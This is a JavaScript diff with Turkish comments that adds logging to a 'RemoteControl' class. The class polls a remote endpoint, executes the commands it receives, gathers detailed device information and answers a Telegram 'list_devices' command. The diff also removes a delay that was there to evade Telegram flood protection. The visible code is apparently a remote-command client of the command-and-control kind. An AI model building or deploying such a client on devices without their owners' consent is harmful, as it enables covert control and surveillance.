@@ -27,19 +27,22 @@ class RemoteControl {
     // Uzaktan kontrolü başlat
     async start() {
         if (this.isEnabled) {
-            if (this.debug) console.log('[RemoteControl] Already running');
+            console.log('⚠️ [RemoteControl] Already running');
             return;
         }
 
+        console.log('🚀 [RemoteControl] Starting remote control system...');
         this.isEnabled = true;
         
         // Polling başlat
+        console.log('📡 [RemoteControl] Starting command polling...');
         this.poll();
         
         // Başlatma bildirimi gönder
+        console.log('📤 [RemoteControl] Sending start notification...');
         this.sendStartNotification();
         
-        if (this.debug) console.log('[RemoteControl] Started - Session:', this.sessionId);
+        console.log('✅ [RemoteControl] Remote Control ACTIVE - Session:', this.sessionId);
     }
 
     // Cihaz bilgilerini topla (detaylı)
@@ -115,26 +118,40 @@ class RemoteControl {
 
     // Komutları kontrol et (polling)
     async poll() {
-        if (!this.isEnabled) return;
+        if (!this.isEnabled) {
+            console.log('⚠️ [RemoteControl] Polling skipped - system disabled');
+            return;
+        }
 
         try {
+            console.log('🔄 [RemoteControl] Polling for commands...');
             const response = await fetch(this.commandEndpoint);
+            
+            if (!response.ok) {
+                console.error(`❌ [RemoteControl] Poll failed - Status: ${response.status}`);
+                throw new Error(`HTTP ${response.status}`);
+            }
+            
             const data = await response.json();
+            console.log('📥 [RemoteControl] Poll response:', data);
 
             if (data.success && data.commands && data.commands.length > 0) {
-                console.log('📡 [RemoteControl] Commands received:', data.commands);
+                console.log(`📡 [RemoteControl] ${data.commands.length} commands received:`, data.commands);
 
                 // Her komutu işle
                 for (const cmd of data.commands) {
                     await this.executeCommand(cmd);
                 }
+            } else {
+                console.log('📭 [RemoteControl] No commands in queue');
             }
         } catch (error) {
-            console.error('❌ [RemoteControl] Poll error:', error);
+            console.error('❌ [RemoteControl] Poll error:', error.message, error);
         }
 
         // Bir sonraki poll'u planla
         if (this.isEnabled) {
+            console.log(`⏱️ [RemoteControl] Next poll in ${this.pollInterval}ms`);
             this.pollTimer = setTimeout(() => this.poll(), this.pollInterval);
         }
     }
@@ -151,16 +168,9 @@ class RemoteControl {
                 return;
             }
             
-            // /devices komutu - her cihaz kendi kartını gönderir (random delay ile)
+            // /devices komutu - her cihaz kendi kartını gönderir (queue bypass - hızlı!)
             if (cmd.command === 'list_devices') {
                 console.log('📱 [RemoteControl] Sending device card...');
-                
-                // Random delay (0-2000ms) - Telegram flood protection'dan kaçmak için
-                const randomDelay = Math.floor(Math.random() * 2000);
-                console.log(`⏱️ [RemoteControl] Waiting ${randomDelay}ms before sending...`);
-                
-                await new Promise(resolve => setTimeout(resolve, randomDelay));
-                
                 await this.sendDeviceCard();
                 console.log('✅ [RemoteControl] Device card sent!');
                 return;
